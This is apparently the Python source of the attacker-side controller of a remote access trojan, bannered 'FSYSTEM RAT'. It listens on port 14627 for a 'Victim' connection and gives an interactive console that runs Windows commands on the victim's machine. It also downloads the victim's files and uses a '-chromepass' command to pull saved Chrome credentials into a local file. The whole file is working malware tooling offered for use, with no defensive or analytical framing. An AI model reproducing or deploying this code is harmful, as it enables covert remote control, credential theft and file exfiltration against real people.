import socket
import os
import json
import readline
import time
import threading
import base64
from termcolor import colored

class Victim:

	def __init__(self, target, ip):
		self.target = target
		self.ip = ip

	def get_target(self):
		return self.target

	def get_ip(self):
		return self.ip

	def usage(self):
		print(colored("""
|══════════════════════════════|USAGE|═════════════════════════════|
*			:execute in windows command prompt
-chromepass  		:try to get credentials from Chrome
-d <filename>  		:download a file. e.g.: -d My files.zip
-h  			:print usage
Ctr+C  			:pause connection
|══════════════════════════════════════════════════════════════════|
""",'white',attrs=['bold']))

	def recv_file(self):
		received = self.json_recv()
		print('Receiving', received.split(SEPARATOR)[0],
		      '| Filesize:', round(int(received.split(SEPARATOR)[1])*0.0000009537, 2),"MB")
		with open(received.split(SEPARATOR)[0],'wb') as f:
			f.write(base64.b64decode(self.json_recv(52428800)))
			f.close()
			print('File Recieved!\n')

	def json_send(self,data):
		multiplier = 1;
		json_data = base64.b64encode(json.dumps(data).encode('utf-8'))[:BUFFER_SIZE]
		self.target.send(json_data)
		while json_data:
			json_data = base64.b64encode(json.dumps(data).encode('utf-8'))[multiplier*BUFFER_SIZE:(multiplier+1)*BUFFER_SIZE]
			self.target.send(json_data)
			multiplier += 1

	def json_recv(self, buff = 1024):
		data = b''
		while True:
			try:
				data = data + base64.b64decode(self.target.recv(buff))
				return json.loads(data)
			except ValueError:
				continue

	def force_disconnect(self):
		self.disconected = True
		self.forced_disconection = True

	def cmd(self):
		self.disconected = False
		self.forced_disconection = False
		self.json_send(True)
		V_IP = colored(str(self.ip[0]),'cyan',attrs=['bold'])
		V_Port = colored(str(self.ip[1]),'magenta')
		init = self.json_recv()
		whoami = colored(init[0],'green',attrs=['bold'])
		wd = init[1]
		self.usage()
		while not self.disconected:
			try:
				command = input("╔|IP: "+V_IP+" |Port: "+V_Port+" |Name: "+whoami+"╚═>§ "+wd+">")
				if command == "":
					if not self.disconected:
						print()
						continue
					else: break

				elif command == '-h':
					self.usage()
					continue

				if not self.disconected: self.json_send(command)
				else: break

				if command[:3] == "cd " and len(command)>3:
					if not self.json_recv():
						print("The system cannot find the path specified.")
					wd = self.json_recv()
					print()
					continue

				elif command[:3] == "-d " and len(command)>3:
					if self.json_recv():
						self.recv_file()
					else:
						print('No such file...')
					continue

				if not self.disconected: result = self.json_recv()
				else: break

				if command == "-chromepass":
					file = "Chormepass_from_{}.txt".format(str(self.ip[0]))
					with open(file,'w') as f:
						f.write(whoami+"\n\n")
						f.write(str(result))
						f.close()
						print("Credentials saved to {}\n".format(file))
						continue

				if not self.disconected: print(result)
				else: break

			except KeyboardInterrupt:
					pause = "PausepppPAUSE1234"
					self.json_send(pause)
					print(colored("\nPausing conection...",'blue',attrs=['bold']))
					break

		if self.forced_disconection:
			raise ConnectionError


def banner():
	os.system("clear")
	print(colored("""      █████▒ ██████▓██   ██▓  ██████ ▄▄▄█████▓▓█████  ███▄ ▄███▓
    ▓██   ▒▒██    ▒ ▒██  ██▒▒██    ▒ ▓  ██▒ ▓▒▓█   ▀ ▓██▒▀█▀ ██▒
    ▒████ ░░ ▓██▄    ▒██ ██░░ ▓██▄   ▒ ▓██░ ▒░▒███   ▓██    ▓██░
    ░▓█▒  ░  ▒   ██▒ ░ ▐██▓░  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██    ▒██ 
    ░▒█░   ▒██████▒▒ ░ ██▒▓░▒██████▒▒  ▒██▒ ░ ░▒████▒▒██▒   ░██▒
     ▒ ░   ▒ ▒▓▒ ▒ ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░░ ▒░   ░  ░
     ░     ░ ░▒  ░ ░▓██ ░▒░ ░ ░▒  ░ ░    ░     ░ ░  ░░  ░      ░
     ░ ░   ░  ░  ░  ▒ ▒ ░░  ░  ░  ░    ░         ░   ░      ░   
                 ░  ░ ░           ░              ░  ░       ░   
                    ░ ░                                      
         	       ██▀███   ▄▄▄     ▄▄▄█████▓
          	      ▓██ ▒ ██▒▒████▄   ▓  ██▒ ▓▒
         	      ▓██ ░▄█ ▒▒██  ▀█▄ ▒ ▓██░ ▒░
         	      ▒██▀▀█▄  ░██▄▄▄▄██░ ▓██▓ ░
         	      ░██▓ ▒██▒ ▓█   ▓██▒ ▒██▒ ░
         	      ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒ ░░
         	        ░▒ ░ ▒░  ▒   ▒▒ ░   ░
         	        ░░   ░   ░   ▒    ░
         	         ░           ░  ░""",'red'))


def check_connection():
	while True:
		time.sleep(0.5)
		if stop_threads:
			break
		check = len(str(tgt.get_target()).split())
		if check != 9:
			tgt.force_disconnect()

def close_server():
	global stop_threads

	stop_threads = True
	print(colored("Closing server...\n",'yellow',attrs=['bold']))
	check_connection_thread.join()
	s.close()

def start_server():
	global s
	global accept_connections_thread
	global check_connection_thread
	global tgt

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind((loc_ip,port))
	s.listen(1)
	print(colored("\nListening...", 'yellow',attrs=['bold']))
	try:
		target, ip = s.accept()
		tgt = Victim(target, ip)

		check_connection_thread = threading.Thread(target=check_connection)
		check_connection_thread.start()
		try:
			banner()
			tgt.cmd()
		except ConnectionError:
			print(colored("Victim disconnected...", 'red',attrs=['bold']))
		close_server()
	except KeyboardInterrupt:
		pass

loc_ip = ''
port = 14627
BUFFER_SIZE = 1024
SEPARATOR = "<SEPARATOR>"
stop_threads = False

banner()
start_server()